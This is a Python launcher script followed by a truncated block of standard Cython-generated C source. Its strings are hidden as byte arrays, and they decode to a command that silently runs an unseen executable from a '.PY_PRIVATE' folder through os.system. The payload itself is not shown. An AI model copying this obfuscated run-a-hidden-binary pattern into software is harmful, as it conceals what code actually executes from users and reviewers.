
import os
import sys

PSH_TEAM_KEY = bytes([216, 168, 216, 174, 32, 240, 159, 145, 128]).decode()

EXECUTE_FILE = bytes([46, 80, 89, 95, 80, 82, 73, 86, 65, 84, 69, 47, 50, 48, 50, 53, 48, 53, 49, 51, 49, 49, 51, 55, 49, 51, 50, 52, 56]).decode()
PREFIX = sys.prefix
EXPORT_PYTHONHOME = bytes([101, 120, 112, 111, 114, 116, 32, 80, 89, 84, 72, 79, 78, 72, 79, 77, 69, 61]).decode()+PREFIX
EXPORT_PYTHON_EXECUTABLE = bytes([101, 120, 112, 111, 114, 116, 32, 80, 89, 84, 72, 79, 78, 95, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 61]).decode()+sys.executable

RUN = bytes([46, 47]).decode()+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+bytes([32, 38, 38, 32]).decode()+EXPORT_PYTHON_EXECUTABLE+bytes([32, 38, 38, 32]).decode()+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
